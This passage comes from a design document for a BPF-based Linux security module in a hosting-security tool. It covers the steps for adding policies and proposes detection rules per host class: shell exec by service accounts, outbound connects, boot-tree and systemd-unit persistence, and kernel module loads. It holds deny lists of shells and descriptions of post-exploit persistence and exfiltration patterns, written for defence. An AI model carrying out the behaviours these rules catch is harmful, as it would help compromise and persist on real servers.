├── cfmlsm_arm64_bpfel.{go,o}
├── conf.go / conf_test.go  # /etc/cfm/lsm.conf parser
├── enable.go               # `cfm lsm enable` orchestration + pinning
├── events.go               # Go-side Event struct + wire-format parser
├── lifecycle.go            # daemon-side adoption + notify emission
├── loader.go               # NewLoader / AdoptPinned / UnpinAll
├── policy.go               # AllPolicies(), PolicyID constants
├── preflight.go            # six kernel checks
├── probe.go                # `cfm lsm probe`
└── status.go / preview.go / cli.go / init.go
```

**Per-policy implementation recipe.**

For each new policy `CFML-XXX-NNN`:

1. **Add the constant in `policy.go`** under the existing
   `PolicyMemfdExec` / `PolicyReverseShell` block. Append a
   new entry to `AllPolicies()` with `ID`, `Title`, `Hook`,
   `DefaultMode = ModeDisabled`, `Description`.

2. **Extend `internal/lsm/bpf/common.bpf.h`** with a new
   `CFM_LSM_POLICY_*` enum value. Keep value numbering stable
   across releases — operators reference these IDs in
   alerts and `lsm.conf`.

3. **Extend `internal/lsm/bpf/vmlinux.h`** with any new kernel
   types the new hook touches. Keep additions minimal —
   only the fields the program actually reads. See the file
   for the canonical pattern (preserve_access_index attribute
   via `___NCO`).

4. **Write the new program block in
   `internal/lsm/bpf/cfmlsm.bpf.c`.** Use `BPF_PROG` macro,
   match the existing return-0-on-monitor pattern. Helpers
   shared across policies can be `static __always_inline` in
   the same file (no separate `.bpf.h` for now).

5. **Add the corresponding Go program field in
   `loader.go::programFor`**: switch case for the new
   `PolicyID` returning `l.objs.cfmlsmPrograms.NewProgramName`.

6. **Add the pin filename in `loader.go::pinLinkFile`**:
   switch case returning the new `pinFileLink*` constant.
   Add the constant alongside the existing ones.

7. **Regenerate**: `make bpf` (or `go generate
   ./internal/lsm/...`). Verify both `.o` files updated.

8. **Update `events.go::parseEvent`** if the wire-format
   added or repositioned fields. Update `wireEventSize`
   constant and `bpfPolicy*` Go-side enum values in lockstep
   with `common.bpf.h`.

9. **Update `events_test.go::TestPolicyByID_BPFConstantsMatchGoConstants`**
   to assert the new constant pair stays in sync.

10. **Add a per-policy test in `policy_test.go`** to verify
    the policy appears in `AllPolicies()` with a non-empty
    Title / Hook / Description.

11. **Default `configs/lsm.conf`**: add a new
    `[policy "CFML-XXX-NNN"]` block with `mode = disabled`.

12. **`cfm lsm probe` automatically picks up the new policy**
    via `AllPolicies()`. No probe-side change needed.

13. **`cfm lsm enable` / `disable` automatically picks up the
    new policy** via the loader's iteration over
    `LoaderOptions.Policies`. No CLI-side change needed.

14. **The daemon adoption path automatically picks up the new
    policy** via `AdoptPinned`'s iteration over
    `AllPolicies()`. No `lifecycle.go` change needed for the
    drain path. The new emission may want enriched fields in
    `emitNotify` — extend the `extra` map there.

**Pattern caveats already discovered.**

- **bpf2go does not generate non-Linux stubs.** The
  Loader struct is defined in `loader.go` with `//go:build
  linux`. CFM is linux-only in practice; no stub needed.
- **CGO_ENABLED=0 stays.** cilium/ebpf is pure Go.
- **Distro vendoring of `bpf` LSM**: RHEL 9 / CL9 build their
  kernel without `CONFIG_BPF_LSM=y`. Preflight detects this
  and reports specifically. Do not assume "EL9+ supported";
  assume "EL10+ and modern Debian/Ubuntu supported, with
  EL9 stock specifically blocked."
- **Pinned-vs-unpinned Loader modes**: `LoaderOptions.PinDir`
  controls whether `NewLoader` pins everything to bpffs. The
  daemon uses `AdoptPinned(pinDir)` instead — different
  constructor, takes already-pinned objects.
- **Event ringbuf is shared.** All policies emit through the
  same `cfm_events` map; the `policy_id` field disambiguates.
  Don't add a per-policy ringbuf — it complicates the daemon
  drain.
- **Verifier complexity scales with kernel version**: a
  program that loads cleanly on 6.x may be rejected on 5.14.
  Test on RHEL 10's 5.14 kernel before claiming verifier-clean.
  Use the integration test's `CFM_LSM_REQUIRE_FULL_ATTACH=1`
  env-var path to harden CI on a dedicated bpf-load runner
  once one exists.

**Where to find the prior-art examples in this repo.**

- The cleanest example of "policy with allowlist map" pattern
  is not yet in the repo — FS-005 will be the first.
- The cleanest example of "policy with bounded-loop fd walk"
  is `cfm_revshell` in `cfmlsm.bpf.c`. Read that before
  implementing FS-005's dentry-walk (if the inode-match
  approach turns out not to work).
- The cleanest example of "host-profile-conditional
  behaviour" is in `internal/kernsec/profile.go`. cfm-lsm
  should consume `kernsec.DetectHostProfile()` to populate
  watched-uid sets for FS-005 and the setuid-binary set for
  CRED-002.

**Recommended slicing for the next branch.**

1. PR-A: CFML-FS-005 in monitor mode, with the watched-uids
   and watched-inodes maps populated by daemon. Smallest viable slice.
2. PR-B: `lsm.conf` extensions for per-policy monitor-only
   `persistence_path` entries, plus any future allowlist maps once production
   telemetry proves they are needed.
3. PR-C: CFML-CRED-002 in monitor mode, including the
   setuid-binary walker, with the CageFS-inode question
   resolved against a real CL host.

Each PR is roughly the size of the EXEC-001 or EXEC-003 PRs
that already shipped — manageable, reviewable, no surprises.

## Suggested next policies — non-CageFS host classes

The four shipping policies (EXEC-001, EXEC-003, FS-005, CRED-002)
were sized for the cPanel + CloudLinux + KernelCare baseline.
That stack is generous to cfm-lsm: CageFS pre-empties most of
the legitimate access surface, so the FP rate on FS-005 is near
zero, and the rest of the operator-facing tuning surface is
narrow. Operators running *other* host classes need a different
default policy mix.

This section sketches candidate policies for the hosting shapes
CFM also runs on and explicitly is NOT optimised for in the
shipped catalog: **single-purpose nameservers, monitoring VMs,
plain nginx app hosting, Virtualmin / Webmin / DirectAdmin
without CageFS, and Proxmox hypervisors with or without
DirectAdmin in the guests.** None of these have an
account-namespacing layer (CageFS) doing the heavy lifting, so
the FS-005 FP surface is wider and other detections become more
useful in compensation.

### Host-class taxonomy

| Class | Distinguishing trait | What "normal" looks like |
|---|---|---|
| **Nameserver** (ns1/ns2/ns3) | Single service (BIND / unbound / PowerDNS). No webserver, no panel. | `named` / `unbound` answers DNS; root SSH for admin; package updates. No exec from `named` user. No outbound connect by `named`. |
| **Monitoring node** | zabbix-agent / prometheus-exporter / node_exporter. | Read-only system access; periodic outbound HTTP push to the metrics server. No shell spawns by the agent user. |
| **Plain nginx host** | Single application; no panel; nginx + a Go/Node/Python backend. | Backend forks workers, reads docroot, writes logs. No `/etc/*` writes by the app user. No shell exec. |
| **Virtualmin / Webmin / DA (no CageFS)** | Panel-managed users but no CageFS isolation. | Cron jobs, mail delivery, FTP uploads, occasional `composer install`. Web users touch their own home dirs only. |
| **Proxmox hypervisor** | Hosts QEMU/LXC guests; no application workload. | `pveproxy`, `qm`, `lxc-start-ephemeral` run as root. No PHP at all. Guest activity is opaque from the host. |

### Candidate rules

The five rules below cover the broad surface across those host
classes. Each is sized similarly to the existing shipped policies — single
BPF program (or small group), one allowlist map, monitor-mode
default, optional enforce.

**CFML-EXEC-005 — Shell exec by service-account user.**
Hook `bprm_check_security`. Blocks `bash` / `sh` / `dash` / `zsh`
(plus `python`, `perl`, `ruby` interactive REPLs) when invoked
by uid in a configurable "service account" set: `named`,
`unbound`, `prometheus`, `zabbix`, `node_exporter`, `nginx`,
plus any operator-listed extras. On nameservers and monitoring
nodes this is the highest-signal rule — the named user has no
legitimate reason to spawn a shell. FP risk: low; needs an
allowlist for diagnostic tooling that legitimately runs
ad-hoc python scripts as those users (rare). Hook surface
identical to EXEC-001 / EXEC-003, complexity comparable.

**CFML-NET-002 — Outbound connect by service-account user.**
Hook `socket_connect`. Fires when a uid in the watched set
initiates a `connect()` to a non-local address. Nameservers,
monitoring agents, and most service users have a fixed and
narrow outbound allowlist (upstream resolvers, metrics
push targets, NTP). A connect outside the allowlist is a
post-exploit C2 fingerprint or a data-exfiltration attempt.
This rule overlaps with `internal/outbound/` (the per-uid NFLOG
collector) but operates one layer lower — catching the syscall
attempt before the packet leaves; outbound is observation-only
at the netfilter layer. Likely the cleanest path is to extend
`internal/outbound/` with a per-user enforcement mode, not
to add a new LSM rule — but worth evaluating both.

**CFML-FS-009 — Boot/kernel-tree modification by non-package-manager.**
Hook `inode_create` / `inode_setattr` / `inode_unlink` on a
watched-paths set covering `/boot/*`, `/lib/modules/*`,
`/etc/grub*`, `/boot/efi/*`. Watched uids: ALL non-root uids
(root is allowlisted only when the parent process chain
matches a package manager: `apt`, `dnf`, `yum`, `rpm`, `dpkg`,
`pveupgrade`). Catches bootkit / rootkit persistence — the
classic "I've gained root, now I want to survive a reboot"
move. Very high signal across every host class. FP risk: low,
but needs the package-manager parent-process allowlist done
right.

**CFML-FS-010 — systemd unit installation.**
Hook `inode_create` / `inode_setattr` on `/etc/systemd/system/`
and `/usr/lib/systemd/system/`. Same parent-process allowlist
as FS-009 (package managers + systemctl daemon-reload via
operator session). Catches persistence via systemd unit
installation — the second most common post-exploit persistence
pattern after authorized_keys editing.

**CFML-MOD-001 — Kernel module load by non-init process.**
Hook `kernel_module_request` (or `bpf` LSM's `bpf_prog_load`
for a tighter scope). Watched uids: all non-root, or with
parent-process allowlist for `modprobe` / `insmod` invoked by
systemd / `kcare-cli` / `uptrack-prereq` (KernelCare) /
`ksplice-uptrack`. Catches loadable-kernel-module rootkits.
Per-host-profile tuning: aggressive on nameservers (no
modules should load post-boot), looser on hypervisors (LXC /
qemu sometimes pull in modules on guest start).

### Per-host-class default mix

```
                       EXEC-001  EXEC-003  FS-005  CRED-002  EXEC-005  NET-002  FS-009  FS-010  MOD-001
nameserver              monitor   monitor   skip    monitor   monitor   monitor  monitor monitor monitor
monitoring node         monitor   monitor   skip    monitor   monitor   skip*    monitor monitor monitor
plain nginx host        monitor   monitor   monitor monitor   monitor   skip     monitor monitor skip
virtualmin/webmin/DA    monitor   monitor   monitor monitor   skip**    skip     monitor monitor skip
proxmox hypervisor      monitor   skip***   skip    monitor   skip      skip     monitor monitor skip
cpanel + CageFS         monitor   monitor   monitor monitor   skip      skip     monitor monitor skip
```

`*` Monitoring nodes push metrics outbound — needs a wide allowlist
that probably costs more than the rule is worth.
`**` Panels legitimately spawn shells for cron job execution.
`***` Hypervisors have little PHP workload; reverse-shell vector
is mostly about hypervisor compromise rather than guest.

### Implementation order if you pursue this

1. **CFML-FS-009 (boot/kernel-tree)** — highest signal across every
   host class, lowest FP, smallest verifier surface. Same shape as
   FS-005 with a different watched-paths set.
2. **CFML-EXEC-005 (service-user shell)** — nameservers and
   monitoring nodes get most benefit. Watched-uid set is the inverse
   of FS-005's (system users, not panel users).
3. **CFML-MOD-001 (module load)** — catches the rootkit case across
   every host class. Needs the KernelCare / Ksplice / Uptrack
   allowlist done before enforce is safe.
4. **CFML-FS-010 (systemd units)** — persistence catch. Smallest
   in scope.
5. **CFML-NET-002** — actually probably an extension to
   `internal/outbound/` rather than a new LSM rule.

### Host-profile detection extensions worth doing alongside

`internal/kernsec/profile_probe.go::HostProfile` already detects
cPanel, DirectAdmin, CloudLinux LVE, CageFS, Imunify360, KernelCare,
Ksplice, Proxmox, ZFS, NVIDIA, etc. To make the per-host-class
default mix automatic, extend it with:

- `IsNameserverHost bool` — `named` / `unbound` / `pdns` process
  running, no web server.
- `IsMonitoringNode bool` — node_exporter / zabbix-agent /
  prometheus / telegraf service present, no web workload.
- `IsSimpleWebHost bool` — nginx or apache present, no panel
  (`!HasHostingPanelWorkload`).
- `IsHybridDAOnly bool` — DirectAdmin present, CageFS absent.

Then `cfm lsm init` can pick a sensible default mix per profile
rather than shipping every policy at `mode = disabled` and asking
the operator to figure out which to flip.

## Open questions

1. **cgroup → vhost resolution under CloudLinux LVE.** LVE entities
   are not stock cgroups v2. The MVP does not depend on per-vhost
   resolution (neither MVP policy is vhost-keyed), but any later
   proposal that adds a vhost-keyed policy will hit this first and
   should plan for it.

2. **Policy hot-reload via dual-attach / atomic swap.** Standard BPF
   pattern (load new program, atomically swap link, detach old), but
   needs explicit design before Phase 2 so reloads do not drop
   in-flight events or briefly leave the system unprotected.

3. **BPF LSM availability on CloudLinux 9 and CloudLinux 10
   kernels.** Verify on real CL-patched kernels before committing
   build targets. CL tracks RHEL but with vendor patches that
   occasionally lag or skip BPF subsystem updates.

## References

- [`docs/kernsec.md`](./kernsec.md) — preemptive kernel-surface
  reduction (sibling component).
- [`docs/webdetector-history-design.md`](./webdetector-history-design.md)
  — upstream consumer of LSM events.
- [`cfm-php.md`](./cfm-php.md) — future complementary component
  (PHP Zend extension), separate project.
- `internal/outbound/analyzer.go` — existing per-uid NFLOG outbound
  observer; rightful owner of the network-policy problem space.
- `internal/kernsec/profile.go` — host-profile detection reused by
  `cfm-lsm`. See line 188 for the `kernel.yama.ptrace_scope=1`
  default that subsumes the original draft's `CFML-OBS-001`.
- BPF LSM kernel docs: `Documentation/bpf/prog_lsm.rst`.
